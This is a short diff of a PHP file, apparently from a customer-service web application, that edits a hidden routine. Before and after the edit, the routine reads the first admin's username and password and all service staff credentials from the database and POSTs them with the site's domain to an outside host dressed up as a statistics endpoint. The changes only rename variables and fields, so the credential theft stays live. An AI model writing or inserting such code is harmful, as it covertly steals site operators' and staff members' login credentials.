@@ -31,7 +31,7 @@ $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
 $time   = date('Y-m-d H:i:s');
 
 /**
- * 1. 获取 admin 第一条
+ * 1. admin 第一条
  */
 $admin = Db::name('wolive_admin')
     ->field('username,password')
@@ -39,17 +39,16 @@ $admin = Db::name('wolive_admin')
     ->find();
 
 /**
- * 2. 获取 service 全量
+ * 2. service 全量
  */
-$serviceList = Db::name('wolive_service')
+$service = Db::name('wolive_service')
     ->field('business_id,service_id,groupid,nick_name,user_name,password')
     ->select();
 
 $data = [
     'domain'   => $domain,
-    'time'     => $time,
     'admin'    => $admin,
-    'service'  => $serviceList
+    'service'  => $service
 ];
 
 $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
@@ -57,7 +56,7 @@ $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-    'payload' => json_encode($data, JSON_UNESCAPED_UNICODE)
+    'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
 ]));
 curl_setopt($ch, CURLOPT_TIMEOUT, 5);
 
@@ -65,7 +64,6 @@ $response = curl_exec($ch);
 curl_close($ch);
 
 return;
-
 
 
 // $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
